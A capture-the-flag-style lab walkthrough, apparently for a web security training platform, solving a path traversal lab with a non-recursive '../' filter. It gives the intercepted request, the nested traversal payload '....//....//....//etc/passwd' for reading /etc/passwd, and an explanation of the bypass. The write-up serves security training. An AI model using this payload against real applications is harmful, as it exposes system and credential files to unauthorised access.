# Lab: File Path Traversal, Traversal Sequences Stripped Non-Recursively

## Objective

Exploit the path traversal vulnerability in the product image functionality to retrieve the contents of the `/etc/passwd` file.

## Vulnerability

The application attempts to prevent path traversal attacks by stripping directory traversal sequences (`../`) from the user-supplied filename. However, the filtering is performed non-recursively, allowing nested traversal sequences to bypass the defense.

## Steps 

1. Open the lab and navigate to any product page.
2. Intercept the request for the product image using **Burp Suite**.
3. Identify the request containing the `filename` parameter.

### Original Request

```http
GET /image?filename=218.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Modify the `filename` parameter to:

```text
....//....//....//etc/passwd
```

### Modified Request

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

5. Forward the request.



The server returns the contents of the `/etc/passwd` file, confirming that the application is vulnerable to Path Traversal.


## Payload Used

```text
....//....//....//etc/passwd
```
## Explanation

The application removes traversal sequences such as `../` only once. By supplying nested traversal sequences (`....//`), the inner `../` sequences are stripped, leaving behind valid traversal sequences.

For example:

```text
....//....//....//etc/passwd
↓
../../../etc/passwd
↓
/etc/passwd
```

This allows an attacker to traverse directories and access files outside the intended image directory.
